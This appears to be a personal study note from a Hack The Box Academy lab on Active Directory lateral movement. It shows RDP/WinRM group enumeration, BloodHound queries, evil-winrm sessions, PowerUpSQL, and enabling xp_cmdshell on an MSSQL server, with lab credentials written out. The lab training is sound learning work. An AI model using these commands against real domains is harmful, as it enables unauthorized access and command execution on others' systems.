Privileged Access
######################

Date: 2025-01-04 14:58:22

Status: #new

Tags: :ref:`active directory enumeration attacks`


Privileges that allow lateral movement 
****************************************

1. CanRDP - has the right to remote desktop (https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
2. CanPSRemote can use WinRM (https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
3. SQLAdmin Can login to SQL servers and run OS commands in the context of the SQL server service account. (https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

172.16.5.225 /  htb-student:HTB_@cademy_stdnt! 


Finding users that are in the Remote Desktop Users Group
**********************************************************

.. code-block:: powershell

    PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

    ComputerName : ACADEMY-EA-MS01
    GroupName    : Remote Desktop Users
    MemberName   : INLANEFREIGHT\Domain Users
    SID          : S-1-5-21-3842939050-3880317879-2865463114-513
    IsGroup      : True
    IsDomain     : UNKNOWN


Finding users that can use :ref:`winrm`
******************************************

.. code-block:: powershell

    PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

    ComputerName : ACADEMY-EA-MS01
    GroupName    : Remote Management Users
    MemberName   : INLANEFREIGHT\forend
    SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
    IsGroup      : False
    IsDomain     : UNKNOWN

You can also search Bloodhound for this information 

Cypher search

.. code-block:: console

    MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

Connecting to the WinRM service
**********************************

Establishing a :ref:`winrm` session from powershell
=====================================================

.. code-block:: powershell

    PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
    PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
    PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

    [ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
    ACADEMY-EA-MS01
    [ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
    PS C:\htb> 

Connecting using :ref:`evil-winrm`
====================================

.. code-block:: bash

    Temen@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend

    Enter Password: 

    Evil-WinRM shell v3.3

    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

    Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

    Info: Establishing connection to remote endpoint

    *Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
    ACADEMY-EA-MS01


SQL Server Admin
********************

Often SQL admin accounts have sysadmin privileges, and you can often get these accounts with responder of password spaying.  Another useful tool 
is :ref:`snaffler` for finding SQL credentials in files. 

Using BloodHound to find SQL Admin rights 

.. code-block:: console

    MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

Using :ref:`PowerUpSQL` to Enumerate MSSQL
============================================

.. code-block:: powershell

    PS C:\htb> cd .\PowerUpSQL\
    PS C:\htb>  Import-Module .\PowerUpSQL.ps1
    PS C:\htb>  Get-SQLInstanceDomain

    ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
    Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
    DomainAccountSid : 1500000521000170152142291832437223174127203170152400
    DomainAccount    : damundsen
    DomainAccountCn  : Dana Amundsen
    Service          : MSSQLSvc
    Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
    LastLogon        : 4/6/2022 11:59 AM

Using PowerShell to test MSSQL instance
=========================================

.. code-block:: powershell

    PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

    VERBOSE: 172.16.5.150,1433 : Connection Success.

    Column1
    -------
    Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...

Connecting from Linux with :ref:`mssqlclient.py`
====================================================

.. code-block:: bash

    Temen@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

    Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

    Password:
    [*] Encryption required, switching to TLS
    [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
    [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
    [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
    [*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
    [*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
    [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
    [!] Press help for extra shell commands


Navigating SQL 
*********************

Once connected we can issue the `help` command to see what options are available to us. 

.. code-block:: console

    SQL> help

        lcd {path}                 - changes the current local directory to {path}
        exit                       - terminates the server process (and this session)
        enable_xp_cmdshell         - you know what it means
        disable_xp_cmdshell        - you know what it means
        xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
        sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
        ! {cmd}                    - executes a local shell cmd

Choosing enable_xp_cmdshell
==============================

.. code-block:: console

    SQL> enable_xp_cmdshell

    [*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
    [*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.


**now we have** the ability to run commands in the format `xp_cmdshell <command>` 

.. code-block:: console

    xp_cmdshell whoami /priv
    output                                                                             

    --------------------------------------------------------------------------------   

    NULL                                                                               

    PRIVILEGES INFORMATION                                                             

    ----------------------                                                             

    NULL                                                                               

    Privilege Name                Description                               State      

    ============================= ========================================= ========   

    SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

    SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

    SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

    SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

    SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

    SeCreateGlobalPrivilege       Create global objects                     Enabled    

    SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


